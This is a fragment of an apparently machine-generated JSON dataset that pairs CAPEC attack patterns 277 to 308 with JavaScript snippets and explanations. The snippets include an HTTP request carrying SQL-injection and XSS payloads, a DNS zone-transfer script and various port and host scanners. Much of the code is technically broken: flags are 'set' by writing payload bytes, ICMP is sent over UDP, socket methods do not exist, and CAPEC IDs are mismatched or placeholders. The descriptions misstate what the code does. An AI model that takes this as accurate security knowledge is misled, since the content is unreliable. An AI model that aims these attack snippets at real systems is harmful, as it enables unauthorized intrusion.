        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a server and sends sensitive information (username and password) in cleartext. This embodies the CAPEC concept of 'Inter-component Protocol Manipulation' by showcasing vulnerabilities such as CWE-319 (Cleartext Transmission of Sensitive Information) and CWE-707 (Improper Neutralization). The code does not ensure the integrity of the message during transmission (CWE-924) and assumes that the received data is trustworthy without proper validation. This can allow an adversary to intercept, manipulate, or impersonate communication between components."
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "const xml2js = require('xml2js');\nconst fs = require('fs');\n\n// Read XML data from a file\nfs.readFile('data.xml', 'utf8', (err, data) => {\n  if (err) throw err;\n\n  // Parse the XML data\n  xml2js.parseString(data, (err, result) => {\n    if (err) throw err;\n\n    // Assume the 'user' field is immutable and trusted\n    const user = result.session.user[0];\n\n    // Incorrectly convert user role\n    const userRole = user === 'admin' ? 'admin' : 'user';\n\n    // Sensitive information included in the response\n    const response = `<response><user>${user}</user><role>${userRole}</role><secret>12345</secret></response>`;\n\n    // Send the response\n    console.log(response);\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of an XML-based data interchange protocol. It reads XML data from a file, parses it, and processes the 'user' field, assuming it is immutable and trusted (CWE-302). The code then incorrectly converts the user role (CWE-1292) and includes sensitive information (CWE-201) in the response. This example highlights the risks of improper neutralization (CWE-707) and reliance on data layout (CWE-188), which can lead to protocol manipulation attacks as described in the CAPEC."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/api/data',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json'\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log('Response:', data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\n// Manipulating the request body to include unexpected values\nconst maliciousPayload = JSON.stringify({\n  userId: '1 OR 1=1', // SQL Injection\n  action: 'delete', // Unauthorized action\n  data: '<script>alert(\"XSS\")</script>' // XSS\n});\n\nreq.write(maliciousPayload);\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a web service protocol manipulation attack. It sends a crafted HTTP POST request to a web service with manipulated parameters. The payload includes SQL injection, unauthorized action, and XSS attack vectors. This embodies the CAPEC idea of manipulating web service protocols to cause unintended behavior, leveraging CWE-707 (Improper Neutralization), CWE-602 (Client-Side Enforcement of Server-Side Security), and CWE-573 (Improper Following of Specification by Caller). The code aims to exploit potential vulnerabilities in the web service by sending unexpected values in the request body."
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "const soapRequest = `\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://example.com/webservices\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:Login>\n         <username>admin</username>\n         <password>admin</password>\n      </web:Login>\n   </soapenv:Body>\n</soapenv:Envelope>`;\n\nfetch('http://example.com/webservices', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'text/xml'\n  },\n  body: soapRequest\n})\n.then(response => response.text())\n.then(data => console.log(data))\n.catch(error => console.error('Error:', error));",
        "description": "This JavaScript code snippet demonstrates a SOAP request to a web service. The SOAP request contains a login operation with hardcoded credentials. This example embodies the main idea of SOAP Manipulation (CAPEC-###) by showing how an attacker could manipulate SOAP parameters to send malicious requests. The code does not ensure that the SOAP message is well-formed or that security properties are met (CWE-707). It also relies on client-side enforcement of security (CWE-602) and does not restrict XML external entity references (CWE-611). Additionally, it demonstrates the potential for authentication bypass by capture-replay (CWE-294) and the use of client-side authentication (CWE-603)."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "const soap = require('soap');\nconst url = 'http://example.com/service?wsdl';\nconst args = { param1: 'value1', param2: 'value2' };\n\nsoap.createClient(url, function(err, client) {\n  if (err) throw err;\n  client.MyFunction(args, function(err, result) {\n    if (err) throw err;\n    console.log(result);\n  });\n});\n\n// Attacker intercepts and modifies the SOAP request\nconst tamperedArgs = { param1: 'maliciousValue', param2: 'value2' };\nclient.MyFunction(tamperedArgs, function(err, result) {\n  if (err) throw err;\n  console.log(result);\n});",
        "description": "This JavaScript code snippet demonstrates a SOAP client making a request to a web service. The code first creates a SOAP client using a WSDL URL and then calls a function on the web service with specific parameters. The vulnerability is illustrated by an attacker intercepting and modifying the SOAP request parameters (tamperedArgs) before sending it to the server. This represents the main idea of SOAP Parameter Tampering (CAPEC-279). The related CWEs provide context on potential weaknesses, such as exposure of sensitive information in the WSDL file (CWE-651) and authentication bypass issues (CWE-294)."
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from([0x08, 0x00, 0x4d, 0x3d, 0x00, 0x01, 0x00, 0x01]); // ICMP Echo Request\nconst targetHost = '192.168.1.1';\nconst targetPort = 7; // Echo Protocol\n\nclient.send(message, targetPort, targetHost, (err) => {\n  if (err) {\n    console.error('Error sending message:', err);\n  } else {\n    console.log('Ping message sent to', targetHost);\n  }\n  client.close();\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received response from ${rinfo.address}: ${msg.toString('hex')}`);\n});",
        "description": "This JavaScript code snippet demonstrates how to send an ICMP Echo Request (Ping) to a target host using UDP sockets. The code creates a UDP client, constructs an ICMP Echo Request message, and sends it to the specified target host and port. If the target host is responsive and not protected by a firewall or ACL, it will reply with an ICMP Echo Reply, which the client listens for and logs. This code embodies the main idea of the CAPEC by illustrating how an adversary might use a Ping to determine if a target system is responsive. The related CWEs provide additional context, such as the potential exposure of sensitive information (CWE-200) and the cleartext transmission of data (CWE-319), which could be exploited by an unauthorized actor."
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "const net = require('net');\n\nconst targetHost = '192.168.1.1';\nconst targetPorts = [22, 80, 443, 8080];\n\nfunction synScan(host, ports) {\n  ports.forEach(port => {\n    const socket = new net.Socket();\n    socket.setTimeout(2000);\n    socket.on('connect', () => {\n      console.log(`Port ${port} is open on ${host}`);\n      socket.destroy();\n    });\n    socket.on('timeout', () => {\n      console.log(`Port ${port} is filtered or closed on ${host}`);\n      socket.destroy();\n    });\n    socket.on('error', (err) => {\n      console.log(`Port ${port} is closed on ${host}`);\n    });\n    socket.connect(port, host);\n  });\n}\n\nsynScan(targetHost, targetPorts);",
        "description": "This JavaScript code snippet performs a basic TCP SYN scan on a specified target host and a list of target ports. The code uses the 'net' module to create a socket connection to each port. If the connection is successful, it logs that the port is open. If the connection times out or encounters an error, it logs that the port is closed or filtered. This embodies the main idea of the CAPEC 'TCP SYN Scan' by demonstrating how an adversary might determine the status of ports on a remote target. The code also indirectly touches on related CWEs such as 'Exposure of Sensitive Information to an Unauthorized Actor' (CWE-200) by potentially revealing open ports, and 'Excessive Attack Surface' (CWE-1125) by scanning multiple ports."
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
        "code_snippet": "const http = require('http');\nconst crypto = require('crypto');\n\nconst server = http.createServer((req, res) => {\n  if (req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      const { username, password } = JSON.parse(body);\n      const hash = crypto.createHash('sha256').update(password).digest('hex');\n      // Vulnerable: Authentication bypass by replay attack\n      if (username === 'admin' && hash === '5e884898da28047151d0e56f8dc6292773603d0d6aabbddc8a1e6d7e9e5b9e9e') {\n        res.writeHead(200, { 'Content-Type': 'text/plain' });\n        res.end('Authenticated');\n      } else {\n        res.writeHead(401, { 'Content-Type': 'text/plain' });\n        res.end('Unauthorized');\n      }\n    });\n  } else {\n    res.writeHead(405, { 'Content-Type': 'text/plain' });\n    res.end('Method Not Allowed');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that listens for POST requests containing a username and password. The server hashes the password using SHA-256 and compares it to a hardcoded hash value. If the username is 'admin' and the hashed password matches the hardcoded hash, the server responds with 'Authenticated'; otherwise, it responds with 'Unauthorized'. This code is vulnerable to a replay attack (CWE-294) because it does not use any mechanism to prevent the reuse of captured authentication data. An attacker could capture the hashed password and replay it to gain unauthorized access. Additionally, the code does not handle state synchronization errors (CWE-373) or reliance on DNS lookups (CWE-247), which are deprecated but relevant in the context of secure authentication mechanisms."
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const user = queryObject.user;\n\n  // CWE-287: Authentication Bypass\n  if (user === 'admin') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome, admin!');\n  } else {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access denied');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server that listens on port 8080. It parses the URL query parameters to extract a 'user' parameter. If the 'user' parameter is 'admin', it grants access by responding with 'Welcome, admin!'. Otherwise, it denies access with 'Access denied'. This code embodies the concept of CAPEC-169 by demonstrating a basic form of infrastructure-based footprinting where an attacker could potentially bypass authentication (CWE-287) by manipulating the URL query parameters. The code is vulnerable because it relies solely on the 'user' parameter for authentication, which can be easily tampered with, leading to an authentication bypass issue."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
        "code_snippet": "const dns = require('dns');\n\nfunction enumerateMXRecords(domain) {\n  dns.resolveMx(domain, (err, addresses) => {\n    if (err) {\n      console.error('Error resolving MX records:', err);\n      return;\n    }\n    addresses.forEach(record => {\n      console.log(`MX Record: ${record.exchange} with priority ${record.priority}`);\n      dns.reverse(record.exchange, (err, hostnames) => {\n        if (err) {\n          console.error('Reverse DNS lookup failed:', err);\n          return;\n        }\n        console.log(`Hostnames for ${record.exchange}: ${hostnames}`);\n      });\n    });\n  });\n}\n\nenumerateMXRecords('example.com');",
        "description": "This JavaScript code snippet demonstrates how to enumerate MX records for a given domain using the 'dns' module. The function 'enumerateMXRecords' takes a domain name as input and performs a DNS query to retrieve the MX records. For each MX record, it logs the mail server's exchange and priority. It then attempts a reverse DNS lookup on the mail server's exchange to obtain associated hostnames. This process can reveal sensitive information about the network's mail servers and potentially expose internal IP addresses or firewall details, aligning with CAPEC-Enumerate Mail Exchange (MX) Records. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200), relying on reverse DNS resolution (CWE-350), and possibly omitting security-relevant information (CWE-223)."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "const dns = require('dns');\n\nfunction performZoneTransfer(domain) {\n  dns.resolveNs(domain, (err, nameservers) => {\n    if (err) throw err;\n    nameservers.forEach(ns => {\n      const dig = require('child_process').exec;\n      dig(`dig @${ns} ${domain} AXFR`, (error, stdout, stderr) => {\n        if (error) {\n          console.error(`Error: ${stderr}`);\n        } else {\n          console.log(`Zone Transfer Data from ${ns}:\n${stdout}`);\n        }\n      });\n    });\n  });\n}\n\nperformZoneTransfer('example.com');",
        "description": "This JavaScript code snippet demonstrates a DNS Zone Transfer attack. It uses the 'dns' module to resolve the nameservers for a given domain and then attempts to perform a zone transfer using the 'dig' command via the 'child_process' module. If the nameserver is misconfigured to allow zone transfers, it will return sensitive information about the domain's DNS records. This embodies the main idea of CAPEC-137 (DNS Zone Transfers) and highlights CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing internal network details. The code also indirectly touches on CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action) by showing how DNS information can be misused."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
        "code_snippet": "const net = require('net');\nconst dns = require('dns');\n\nconst ipRange = ['192.168.1.1', '192.168.1.2', '192.168.1.3']; // Example IP range\n\nipRange.forEach(ip => {\n  const client = new net.Socket();\n  client.setTimeout(1000);\n\n  client.connect(80, ip, () => {\n    console.log(`Host ${ip} is alive`);\n    client.destroy();\n  });\n\n  client.on('error', () => {\n    console.log(`Host ${ip} is not responding`);\n  });\n\n  client.on('timeout', () => {\n    console.log(`Host ${ip} timed out`);\n    client.destroy();\n  });\n\n  // Reverse DNS resolution (CWE-350)\n  dns.reverse(ip, (err, hostnames) => {\n    if (err) {\n      console.log(`Reverse DNS lookup failed for ${ip}`);\n    } else {\n      console.log(`Reverse DNS lookup for ${ip}: ${hostnames}`);\n    }\n  });\n});",
        "description": "This JavaScript code snippet performs a basic host discovery (CAPEC-309) by attempting to connect to a range of IP addresses on port 80. If a connection is successful, it logs that the host is alive. It also includes a reverse DNS lookup (CWE-350) to demonstrate reliance on reverse DNS resolution for potentially security-critical actions. The code highlights the potential exposure of sensitive information (CWE-200) and the risk of cleartext transmission (CWE-319) if sensitive data were to be sent over this connection. The snippet is a simplified example of how an adversary might perform network reconnaissance to identify live hosts within a target network."
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "const net = require('net');\n\nfunction traceroute(target) {\n  let ttl = 1;\n  const maxHops = 30;\n\n  function sendPacket() {\n    const socket = new net.Socket();\n    socket.setTimeout(5000);\n    socket.on('error', (err) => console.log(`Error: ${err.message}`));\n    socket.on('timeout', () => console.log(`Hop ${ttl}: Request timed out`));\n    socket.connect(80, target, () => {\n      console.log(`Hop ${ttl}: Reached ${target}`);\n      socket.destroy();\n    });\n    socket.setTTL(ttl);\n    ttl++;\n    if (ttl <= maxHops) {\n      setTimeout(sendPacket, 1000);\n    }\n  }\n\n  sendPacket();\n}\n\ntraceroute('example.com');",
        "description": "This JavaScript code snippet demonstrates a simple traceroute implementation using TCP packets. The `traceroute` function attempts to connect to a target server, incrementing the Time-to-Live (TTL) value with each attempt to map out the route data takes through the network. The code uses the `net` module to create a socket and set its TTL, simulating the traceroute process. This code embodies the main idea of CAPEC-292 (Traceroute Route Enumeration) by illustrating how an adversary might map network topology. The related CWEs are represented by the potential exposure of sensitive information (e.g., network structure) to unauthorized actors, improper management of trace data, and the risk of transmitting sensitive information in cleartext."
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst ICMP_TYPE_ADDRESS_MASK_REQUEST = 17;\nconst ICMP_CODE = 0;\nconst ICMP_CHECKSUM = 0;\nconst ICMP_IDENTIFIER = 0;\nconst ICMP_SEQUENCE_NUMBER = 0;\n\nconst buffer = Buffer.alloc(8);\nbuffer.writeUInt8(ICMP_TYPE_ADDRESS_MASK_REQUEST, 0);\nbuffer.writeUInt8(ICMP_CODE, 1);\nbuffer.writeUInt16BE(ICMP_CHECKSUM, 2);\nbuffer.writeUInt16BE(ICMP_IDENTIFIER, 4);\nbuffer.writeUInt16BE(ICMP_SEQUENCE_NUMBER, 6);\n\nclient.send(buffer, 0, buffer.length, 7, '192.168.1.1', (err) => {\n  if (err) {\n    console.error('Error sending ICMP Address Mask Request:', err);\n  } else {\n    console.log('ICMP Address Mask Request sent');\n  }\n  client.close();\n});",
        "description": "This JavaScript code snippet demonstrates how to send an ICMP Address Mask Request (Type 17) to a target IP address (192.168.1.1) using the 'dgram' module for UDP communication. The code constructs an ICMP packet with the necessary fields and sends it to the target. This action can expose sensitive network configuration information, such as subnet masks and default gateways, to an unauthorized actor, aligning with CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor). The code also implicitly relies on the IP address for communication, touching on CWE-291 (Reliance on IP Address for Authentication). The use of '0.0.0.0' as a binding address (CWE-1327) and improper restriction of communication channels (CWE-923) are potential weaknesses that could be exploited in a real-world scenario."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.method === 'GET' && req.url.includes('/timestamp')) {\n    const timestamp = new Date().toISOString();\n    res.writeHead(200, { 'Content-Type': 'text/plain' });\n    res.end(`Timestamp: ${timestamp}`);\n  } else {\n    res.writeHead(404, { 'Content-Type': 'text/plain' });\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates a simple HTTP server using Node.js. The server listens for GET requests at the '/timestamp' endpoint and responds with the current timestamp. This setup embodies the 'Timestamp Request' CAPEC by exposing the server's current time. An attacker could use this information to exploit time-based security mechanisms. The code also touches on related CWEs: it exposes sensitive information (CWE-200), uses GET requests with potentially sensitive data (CWE-598), and could be used to observe timing discrepancies (CWE-208) or create covert timing channels (CWE-385)."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  if (msg.toString() === 'ICMP_INFO_REQUEST') {\n    const response = Buffer.from('ICMP_INFO_RESPONSE');\n    server.send(response, 0, response.length, rinfo.port, rinfo.address, (err) => {\n      if (err) console.error('Error sending response:', err);\n    });\n  }\n});\n\nserver.bind(12345, () => {\n  console.log('Server listening on port 12345');\n});",
        "description": "This JavaScript code snippet creates a UDP server that listens for incoming messages. When it receives a message with the content 'ICMP_INFO_REQUEST', it responds with 'ICMP_INFO_RESPONSE'. This simulates the behavior of an ICMP Information Request and Response, which is a deprecated mechanism. The code demonstrates the potential exposure of sensitive information (CWE-200, CWE-497) and the transmission of data in cleartext (CWE-319). The use of a simple string comparison and response mechanism highlights the lack of robust security measures, which could be exploited by an adversary to gather information about the host."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "const net = require('net');\n\nfunction sendTcpAckPing(host, port) {\n  const client = new net.Socket();\n  client.connect(port, host, () => {\n    const ackPacket = Buffer.from([0x10]); // ACK flag set\n    client.write(ackPacket);\n  });\n\n  client.on('data', (data) => {\n    if (data.includes(Buffer.from([0x14]))) { // RST flag set\n      console.log('Host is alive');\n    }\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error('Connection error:', err.message);\n    client.destroy();\n  });\n}\n\nsendTcpAckPing('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP ACK Ping to determine if a remote host is alive. It uses the 'net' module to create a TCP connection to a specified host and port. The code sends a TCP segment with the ACK flag set. If the host is alive, it will respond with a RST packet, which the code detects and logs a message indicating the host is alive. This snippet embodies the CAPEC concept of using TCP ACK Ping to check for host availability. Additionally, it touches on CWE-319 by potentially exposing sensitive information in cleartext, and CWE-200 by revealing the host's status to an unauthorized actor."
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('');\nconst targetHost = '192.168.1.1'; // Target IP address\nconst targetPort = 65535; // High port number\n\nclient.send(message, 0, message.length, targetPort, targetHost, (err) => {\n  if (err) {\n    console.error('Error sending UDP packet:', err);\n  } else {\n    console.log('UDP packet sent');\n  }\n  client.close();\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received message: ${msg} from ${rinfo.address}:${rinfo.port}`);\n});",
        "description": "This JavaScript code snippet demonstrates a UDP ping to a high port (65535) on a target host (192.168.1.1) to check if the host is alive. The code uses the 'dgram' module to create a UDP socket and sends an empty UDP datagram to the target. If the target host is alive and the port is closed, it will respond with an 'ICMP port unreachable' message, which can be captured by the 'message' event listener. This approach leverages the CAPEC concept of using UDP pings to determine host availability. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information) by potentially revealing the host's status, and CWE-941 (Incorrectly Specified Destination) by targeting a high, likely unused port."
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "const net = require('net');\n\nfunction tcpSynPing(target, port) {\n  const client = new net.Socket();\n  client.setTimeout(5000);\n\n  client.connect(port, target, () => {\n    console.log('TCP SYN packet sent');\n  });\n\n  client.on('data', (data) => {\n    console.log('Received response:', data.toString());\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.log('Error:', err.message);\n    client.destroy();\n  });\n\n  client.on('timeout', () => {\n    console.log('No response, target might be down or port is closed');\n    client.destroy();\n  });\n}\n\ntcpSynPing('192.168.1.1', 80);",
        "description": "This JavaScript code snippet uses the 'net' module to create a TCP client that attempts to connect to a specified target and port, simulating a TCP SYN ping. The client sends a TCP SYN packet to the target. If the target responds, it logs the response, indicating that the target is alive. If there is no response within the timeout period, it logs that the target might be down or the port is closed. This embodies the main idea of the CAPEC 'TCP SYN Ping' by using TCP SYN packets for host discovery. The code also touches on CWE-200 (Exposure of Sensitive Information) as it reveals whether a host is alive, and CWE-319 (Cleartext Transmission of Sensitive Information) as the data is transmitted in cleartext."
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "const net = require('net');\n\nconst sensitiveData = 'Sensitive Information';\nconst port = 8080;\n\nconst server = net.createServer((socket) => {\n  socket.write(sensitiveData); // CWE-319: Cleartext Transmission of Sensitive Information\n  socket.end();\n});\n\nserver.listen(port, () => {\n  console.log(`Server listening on port ${port}`);\n});\n\n// CWE-605: Multiple Binds to the Same Port\nconst anotherServer = net.createServer((socket) => {\n  socket.write('Another service on the same port');\n  socket.end();\n});\n\nanotherServer.listen(port, () => {\n  console.log(`Another server also listening on port ${port}`);\n});",
        "description": "This JavaScript code snippet creates two TCP servers that both attempt to bind to the same port (8080). The first server transmits sensitive information in cleartext, which can be intercepted by unauthorized actors (CWE-319). The second server also binds to the same port, which can lead to service hijacking or spoofing (CWE-605). This setup demonstrates the vulnerabilities associated with port scanning, where an adversary can identify open ports and exploit these weaknesses to gain unauthorized access to sensitive information or disrupt services."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "const net = require('net');\n\nconst targetIP = '192.168.1.1';\nconst targetPort = 80;\n\nconst client = new net.Socket();\nclient.connect(targetPort, targetIP, () => {\n  console.log('Connected to ' + targetIP + ':' + targetPort);\n  client.end();\n});\n\nclient.on('error', (err) => {\n  console.log('Port ' + targetPort + ' is closed or unreachable.');\n});",
        "description": "This JavaScript code snippet demonstrates a basic TCP connect scan, which is the main idea of the CAPEC. The code attempts to establish a full TCP connection to a specified IP address and port. If the connection is successful, it logs a message indicating the port is open. If the connection fails, it logs that the port is closed or unreachable. This process embodies the 'three-way handshake' method used in TCP connect scans. The code also indirectly touches on related CWEs: it could expose sensitive information (CWE-200) if the target IP is sensitive, and it relies on the IP address for determining the state of the port (CWE-291)."
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "const net = require('net');\n\nfunction tcpFinScan(target, port) {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    const finPacket = Buffer.from([0x01]); // Simplified FIN packet\n    client.write(finPacket);\n  });\n\n  client.on('data', (data) => {\n    if (data.includes('RST')) {\n      console.log(`Port ${port} is closed on ${target}`);\n    } else {\n      console.log(`Port ${port} is open on ${target}`);\n    }\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error(`Error: ${err.message}`);\n    client.destroy();\n  });\n}\n\ntcpFinScan('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a simplified TCP FIN scan to determine if a port is closed on a target machine. The `tcpFinScan` function connects to a specified target and port, sends a simplified FIN packet, and listens for a response. If a 'RST' (Reset) packet is received, it indicates that the port is closed. Otherwise, the port is considered open. This scan leverages the behavior described in RFC 793, where out-of-state FIN packets to closed ports result in RST responses. The code also includes basic error handling. This example embodies the CAPEC concept of using TCP FIN scans to detect closed ports and highlights CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially revealing port states to unauthorized actors."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "const net = require('net');\n\nfunction sendXmasScan(target, port) {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    const xmasPacket = Buffer.from([0xFF, 0xFF, 0xFF, 0xFF]); // All flags set\n    client.write(xmasPacket);\n  });\n\n  client.on('data', (data) => {\n    if (data.includes('RST')) {\n      console.log(`Port ${port} is closed on ${target}`);\n    }\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error(`Error: ${err.message}`);\n    client.destroy();\n  });\n}\n\nsendXmasScan('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP Xmas scan, which is used to determine if ports are closed on a target machine. The code uses the 'net' module to create a TCP connection to a specified target and port. It then sends a packet with all TCP flags set (Xmas packet). If a 'RST' (reset) packet is received in response, it indicates that the port is closed. This scan technique leverages the behavior described in RFC 793, where closed ports respond with a RST packet to out-of-state TCP segments. The code also highlights potential weaknesses such as exposure of sensitive information (CWE-200), lack of integrity checks (CWE-353), and improper restriction of communication channels (CWE-923)."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "const net = require('net');\n\nfunction tcpNullScan(target, port) {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    const nullPacket = Buffer.alloc(0); // Create an empty buffer to simulate a NULL packet\n    client.write(nullPacket);\n  });\n\n  client.on('data', (data) => {\n    console.log(`Received data: ${data.toString()}`);\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    if (err.code === 'ECONNRESET') {\n      console.log('Port is closed (RST received)');\n    } else {\n      console.log(`Error: ${err.message}`);\n    }\n    client.destroy();\n  });\n}\n\ntcpNullScan('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP NULL scan, which is used to determine if ports are closed on a target machine. The code uses the 'net' module to create a TCP connection to a specified target and port. It sends an empty buffer to simulate a TCP segment with no flags (NULL packet). If the port is closed, the target machine will respond with a TCP RST packet, which triggers an 'ECONNRESET' error. The code logs this event, indicating that the port is closed. This scan technique leverages the behavior described in RFC 793, where out-of-state flags sent to closed ports result in RST packets. The code also highlights potential weaknesses such as exposure of sensitive information (CWE-200), missing integrity checks (CWE-353), and cleartext transmission (CWE-319)."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "const net = require('net');\n\nfunction tcpAckScan(target, port) {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    const ackPacket = Buffer.from([0x10]); // ACK flag\n    client.write(ackPacket);\n  });\n\n  client.on('data', (data) => {\n    console.log('Received:', data.toString());\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error('Error:', err.message);\n  });\n}\n\ntcpAckScan('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a basic TCP ACK scan using Node.js. The function `tcpAckScan` takes a target IP address and a port number as arguments. It creates a TCP socket and connects to the specified target and port. Once connected, it sends a packet with the ACK flag set. The response from the target is logged to the console. This scan can help identify firewall or ACL configurations by analyzing the responses. The code also handles errors that may occur during the connection.\n\nThe code embodies the main idea of CAPEC-303 (TCP ACK Scan) by attempting to gather information about firewall or ACL configurations. It also touches on related CWEs:\n- CWE-200: The scan could potentially expose sensitive information about the network configuration.\n- CWE-1280: The scan might reveal if access control checks are implemented after the asset is accessed.\n- CWE-605: Multiple binds to the same port could be detected if the port is already in use.\n- CWE-319: Although not directly transmitting sensitive information, the scan itself could be sniffed if not properly secured.\n- CWE-529: The scan might expose access control list files if they are not properly secured."
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "const net = require('net');\n\nfunction tcpWindowScan(targetIP, targetPort) {\n  const client = new net.Socket();\n  client.connect(targetPort, targetIP, () => {\n    client.write('GET / HTTP/1.1\\r\\nHost: ' + targetIP + '\\r\\n\\r\\n');\n  });\n\n  client.on('data', (data) => {\n    const windowSize = data.readUInt16BE(14); // Extract TCP Window Size from the TCP header\n    console.log(`Window Size: ${windowSize}`);\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error(`Error: ${err.message}`);\n  });\n}\n\ntcpWindowScan('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a basic TCP Window Scan using Node.js. The function `tcpWindowScan` connects to a specified target IP and port, sends a simple HTTP GET request, and then reads the TCP Window Size from the response. The window size is extracted from the TCP header and logged to the console. This scan can help infer the status of the port and potentially the operating system type based on the window size value. The code embodies the CAPEC concept by attempting to gather sensitive system information (CWE-497) through network communication that could be intercepted (CWE-319). The lack of integrity checks (CWE-353) and potential exposure of sensitive information (CWE-200) are also relevant in this context."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "const net = require('net');\nconst rpcPort = 111; // Common RPC port\n\nconst client = new net.Socket();\nclient.connect(rpcPort, 'target-host', () => {\n  console.log('Connected to RPC service');\n  client.write('RPC request data'); // CWE-200: Potential exposure of sensitive information\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // CWE-294: Replay the captured data\n  client.write(data);\n});\n\nclient.on('error', (err) => {\n  console.error('Connection error:', err);\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a common RPC port (111) on a target host. The client sends an initial RPC request and logs any received data. The received data is then replayed back to the server, potentially exploiting a capture-replay vulnerability (CWE-294). The code also highlights the risk of exposing sensitive information (CWE-200) by logging the received data. This snippet embodies the main idea of a TCP RPC scan by attempting to interact with and exploit RPC services on a Unix/Linux host."
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
